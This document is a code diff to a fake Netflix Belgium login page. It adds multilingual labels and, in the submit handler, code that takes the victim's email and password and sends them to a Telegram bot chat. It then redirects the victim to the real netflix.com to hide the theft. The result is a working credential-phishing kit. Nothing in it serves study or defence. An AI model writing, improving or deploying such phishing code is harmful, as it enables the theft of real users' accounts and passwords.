@@ -182,6 +182,7 @@
             display: flex;
             align-items: center;
             gap: 5px;
+            white-space: nowrap;
         }
 
         .remember-checkbox {
@@ -312,31 +313,31 @@
 
     <main>
         <div class="login-container">
-            <h1>S'identifier</h1>
+            <h1 id="loginTitle">S'identifier</h1>
             <form id="loginForm">
                 <div class="input-group">
                     <input type="email" id="email" name="email" placeholder=" " required>
-                    <label for="email">E-mail ou numéro de téléphone</label>
+                    <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" name="password" placeholder=" " required>
-                    <label for="password">Mot de passe</label>
+                    <label for="password" id="passwordLabel">Mot de passe</label>
                 </div>
                 <button type="submit" class="login-button" id="submitBtn">
-                    <span>S'identifier</span>
+                    <span id="submitText">S'identifier</span>
                     <div class="spinner"></div>
                 </button>
                 <div class="options-container">
                     <div class="remember-me">
                         <input type="checkbox" id="remember" class="remember-checkbox">
-                        <label for="remember">Se souvenir de moi</label>
+                        <label for="remember" id="rememberLabel">Se souvenir de moi</label>
                     </div>
-                    <a href="#" class="help-link">Besoin d'aide ?</a>
+                    <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                 </div>
             </form>
             <div class="signup-text">
-                <span>Nouveau sur Netflix ?</span> 
-                <a href="#" class="signup-link">Inscrivez-vous maintenant.</a>
+                <span id="newUserText">Nouveau sur Netflix ?</span> 
+                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
             </div>
         </div>
     </main>
@@ -344,39 +345,182 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-top">
-                <span>Des questions ? Appelez le </span> 
+                <span id="questionsText">Des questions ? Appelez le </span> 
                 <a href="tel:0800-38963" class="footer-link">0800-38963</a>
             </div>
             <div class="footer-links">
-                <a href="#" class="footer-link">FAQ</a>
-                <a href="#" class="footer-link">Centre d'aide</a>
-                <a href="#" class="footer-link">Conditions d'utilisation</a>
-                <a href="#" class="footer-link">Confidentialité</a>
-                <a href="#" class="footer-link">Préférences de cookies</a>
-                <a href="#" class="footer-link">Mentions légales</a>
-                <a href="#" class="footer-link">Choix liés à la pub</a>
+                <a href="#" class="footer-link" id="faqLink">FAQ</a>
+                <a href="#" class="footer-link" id="helpCenterLink">Centre d'aide</a>
+                <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
+                <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
+                <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
+                <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
+                <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
             </div>
-            <div>Netflix Belgique</div>
+            <div id="countryText">Netflix Belgique</div>
         </div>
     </footer>
 
     <script>
-        // Gestion du formulaire
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Remplacez par votre token
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Remplacez par votre chat ID
+
+        // Textes pour les différentes langues
+        const translations = {
+            fr: {
+                loginTitle: "S'identifier",
+                emailLabel: "E-mail ou numéro de téléphone",
+                passwordLabel: "Mot de passe",
+                submitText: "S'identifier",
+                rememberLabel: "Se souvenir de moi",
+                helpLink: "Besoin d'aide ?",
+                newUserText: "Nouveau sur Netflix ?",
+                signupLink: "Inscrivez-vous maintenant.",
+                questionsText: "Des questions ? Appelez le ",
+                faqLink: "FAQ",
+                helpCenterLink: "Centre d'aide",
+                termsLink: "Conditions d'utilisation",
+                privacyLink: "Confidentialité",
+                cookiesLink: "Préférences de cookies",
+                legalLink: "Mentions légales",
+                adsLink: "Choix liés à la pub",
+                countryText: "Netflix Belgique"
+            },
+            nl: {
+                loginTitle: "Inloggen",
+                emailLabel: "E-mail of telefoonnummer",
+                passwordLabel: "Wachtwoord",
+                submitText: "Inloggen",
+                rememberLabel: "Onthoud mij",
+                helpLink: "Hulp nodig?",
+                newUserText: "Nieuw bij Netflix?",
+                signupLink: "Meld je nu aan.",
+                questionsText: "Vragen? Bel ",
+                faqLink: "FAQ",
+                helpCenterLink: "Helpcentrum",
+                termsLink: "Gebruiksvoorwaarden",
+                privacyLink: "Privacy",
+                cookiesLink: "Cookievoorkeuren",
+                legalLink: "Juridische bepalingen",
+                adsLink: "Advertentievoorkeuren",
+                countryText: "Netflix België"
+            },
+            de: {
+                loginTitle: "Anmelden",
+                emailLabel: "E-Mail oder Telefonnummer",
+                passwordLabel: "Passwort",
+                submitText: "Anmelden",
+                rememberLabel: "Angemeldet bleiben",
+                helpLink: "Hilfe benötigt?",
+                newUserText: "Neu bei Netflix?",
+                signupLink: "Jetzt registrieren.",
+                questionsText: "Fragen? Rufen Sie ",
+                faqLink: "FAQ",
+                helpCenterLink: "Hilfecenter",
+                termsLink: "Nutzungsbedingungen",
+                privacyLink: "Datenschutz",
+                cookiesLink: "Cookie-Einstellungen",
+                legalLink: "Impressum",
+                adsLink: "Werbeauswahl",
+                countryText: "Netflix Belgien"
+            }
+        };
+
+        // Fonction pour envoyer un message Telegram
+        function sendTelegramMessage(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
-            const submitBtn = document.getElementById('submitBtn');
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Message envoyé à Telegram:', data);
+            })
+            .catch(error => {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+            });
+        }
+
+        // Fonction pour changer la langue
+        function changeLanguage(lang) {
+            const texts = translations[lang];
             
-            // Afficher le spinner
-            submitBtn.classList.add('btn-loading');
+            // Mettre à jour tous les textes
+            document.getElementById('loginTitle').textContent = texts.loginTitle;
+            document.getElementById('emailLabel').textContent = texts.emailLabel;
+            document.getElementById('passwordLabel').textContent = texts.passwordLabel;
+            document.getElementById('submitText').textContent = texts.submitText;
+            document.getElementById('rememberLabel').textContent = texts.rememberLabel;
+            document.getElementById('helpLink').textContent = texts.helpLink;
+            document.getElementById('newUserText').textContent = texts.newUserText;
+            document.getElementById('signupLink').textContent = texts.signupLink;
+            document.getElementById('questionsText').textContent = texts.questionsText;
+            document.getElementById('faqLink').textContent = texts.faqLink;
+            document.getElementById('helpCenterLink').textContent = texts.helpCenterLink;
+            document.getElementById('termsLink').textContent = texts.termsLink;
+            document.getElementById('privacyLink').textContent = texts.privacyLink;
+            document.getElementById('cookiesLink').textContent = texts.cookiesLink;
+            document.getElementById('legalLink').textContent = texts.legalLink;
+            document.getElementById('adsLink').textContent = texts.adsLink;
+            document.getElementById('countryText').textContent = texts.countryText;
             
-            // Simuler le traitement de connexion
-            setTimeout(() => {
-                // Redirection vers la page d'accueil après connexion
-                window.location.href = "https://www.netflix.com/be-fr/";
-            }, 2000);
+            // Sauvegarder la langue sélectionnée
+            localStorage.setItem('selectedLanguage', lang);
+        }
+
+        // Initialisation au chargement de la page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Récupérer la langue sauvegardée ou utiliser le français par défaut
+            const savedLanguage = localStorage.getItem('selectedLanguage') || 'fr';
+            document.getElementById('languageSelector').value = savedLanguage;
+            changeLanguage(savedLanguage);
+            
+            // Écouter les changements de langue
+            document.getElementById('languageSelector').addEventListener('change', function() {
+                changeLanguage(this.value);
+            });
+            
+            // Gestion du formulaire
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const submitBtn = document.getElementById('submitBtn');
+                const email = document.getElementById('email').value;
+                const password = document.getElementById('password').value;
+                
+                // Afficher le spinner
+                submitBtn.classList.add('btn-loading');
+                
+                // Préparer le message pour Telegram
+                const currentDate = new Date().toLocaleString('fr-BE');
+                const message = `
+🔐 <b>Nouvelle tentative de connexion Netflix Belgique</b>
+
+📧 <b>Email:</b> ${email}
+🔑 <b>Mot de passe:</b> ${password}
+🌐 <b>Langue:</b> ${document.getElementById('languageSelector').value}
+🕐 <b>Date:</b> ${currentDate}
+                `;
+                
+                // Envoyer le message à Telegram
+                sendTelegramMessage(message);
+                
+                // Simuler le traitement de connexion
+                setTimeout(() => {
+                    // Redirection vers la page d'accueil après connexion
+                    window.location.href = "https://www.netflix.com/be-fr/";
+                }, 2000);
+            });
         });
     </script>
 </body>
